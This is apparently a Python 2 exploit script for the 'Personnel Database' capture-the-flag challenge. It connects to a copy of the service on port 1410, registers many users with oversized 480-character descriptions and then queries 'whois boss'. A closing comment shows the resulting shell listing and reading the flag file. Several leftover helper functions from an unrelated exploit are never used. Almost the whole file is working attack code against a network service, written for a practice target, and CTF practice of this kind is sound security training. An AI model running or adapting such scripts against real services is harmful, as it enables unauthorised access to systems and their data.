__author__ = 'HuyNA'

'''
Personnel Database

Lots of criminals in this area work for one big boss,
but we have been unable to determine who he is.

Do you think you can get around their protections?

Download
nc wildwildweb.fluxfingers.net 1410

Note: The users dir will be wiped every 5 minutes.

'''

import struct
import socket
import telnetlib
import hexdump
import time
import hashlib
import sys

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0x99)
    return decode_string

def write_entry(f, index, data):
    f.write('2\n')
    f.write(str(index) + '\n')
    f.write(str(len(data)) + '\n')
    f.write(data)
    assert f.readline().strip() == 'OK'

def free_entry(f, index):
    f.write('3\n')
    f.write(str(index) + '\n')
    assert f.readline().strip() == 'OK'

def printf_entry(f, index, delim='END\n'):
    f.write('3\n')
    f.write(str(index) + '\n')
    resp = readuntil(f, delim)[:-len(delim)]
    assert f.readline().strip() == 'OK'
    return resp

def do_printf(f, index, fmt):
    write_entry(f, index, fmt + 'END\n\0')
    return printf_entry(f, index)

def allocate_entry(f, length):
    f.write('1\n')
    f.write(str(length) + '\n')
    index = int(f.readline())
    assert f.readline().strip() == 'OK'
    return index

def strlen_entry(f, index):
    f.write('4\n')
    f.write(str(index) + '\n')
    msg = f.readline().strip()
    assert f.readline().strip() == 'OK'
    return msg

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
# nc wildwildweb.fluxfingers.net 1410
s = socket.create_connection(('192.168.248.129', 1410))
#s = socket.create_connection(('wildwildweb.fluxfingers.net', 1410))
username = 'huyna'
password = '11111111'
array_user = []
description = '2'*480
for i in xrange(10):
    print recv_until(s, '> ')
    username += '1'
    array_user.append(username)
    s.send('register '+username+':'+password+ '\n')
    time.sleep(0.001)
    print recv_until(s, '> ')
    s.send('set_description '+description+'\n')
    time.sleep(0.001)

print recv_until(s, '> ')
username += '1'
array_user.append(username)
s.send('register '+username+':'+password+ '\n')

print array_user

time.sleep(0.001)
print recv_until(s, '> ')
s.send('set_description '+description+'\n')
time.sleep(0.001)

print recv_until(s, '> ')
s.send('logout\n')
time.sleep(0.001)


print recv_until(s, '> ')
s.send('register huyna:111111111\n')

time.sleep(0.001)

print recv_until(s, '> ')
s.send('whoami\n')

time.sleep(0.001)

print recv_until(s, '> ')
s.send('whois boss\n')

time.sleep(0.001)

print recv_until(s, '> ')
'''
 Action: 1
ls
fl4g  oreo
cat fl4g
flag{FASTBINS_ARE_NICE_ARENT_THEY}
'''